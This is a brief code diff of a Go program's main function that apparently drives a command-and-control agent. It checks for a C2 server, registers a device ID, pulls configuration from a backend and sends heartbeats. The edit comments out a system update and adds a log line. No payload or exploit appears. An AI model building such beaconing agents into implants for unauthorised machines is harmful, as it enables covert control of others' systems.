@@ -14,17 +14,19 @@ func main() {
 	log.InitLog(true)
 	config.ReadConfigFile()
 	helper.CheckForInternet()
-	helper.UpdateSystem()
+	// helper.UpdateSystem()
 	helper.CheckForC2Server(config.Config.C2)
 	config.Config.IpStr = helper.GetIP().String()
 	if !config.CheckIfDeviceIDExits() {
 		api.GetDeviceIDFromAPI()
 		config.WriteConfToYAML()
+		log.Logger.Info().Msgf("[+]\tFirst time configuration [DONE]")
+
 	}
 	go api.GetConfFromBackend()
 	go api.Heartbeat()
-	for {}
-
+	for {
+	}
 
 	// api.GetDeviceIDFromAPI()
 	// config.AddDeviceIDtoYAML()
